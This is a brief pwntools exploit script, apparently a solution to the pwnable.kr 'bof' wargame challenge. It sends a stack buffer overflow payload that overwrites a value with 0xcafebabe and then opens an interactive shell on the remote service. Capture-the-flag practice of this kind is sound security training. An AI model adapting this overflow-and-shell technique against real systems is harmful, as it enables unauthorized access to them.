#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *

context(arch='i386', os='linux')
context.log_level = 'DEBUG'

OFFSET = 0x2C + 0x08

payload = OFFSET * 'a' + p32(0xcafebabe)

io = remote('pwnable.kr', 9000)
#io.recvuntil(': \n')
io.sendline(payload)
sleep(0.5)
io.interactive()
io.close()
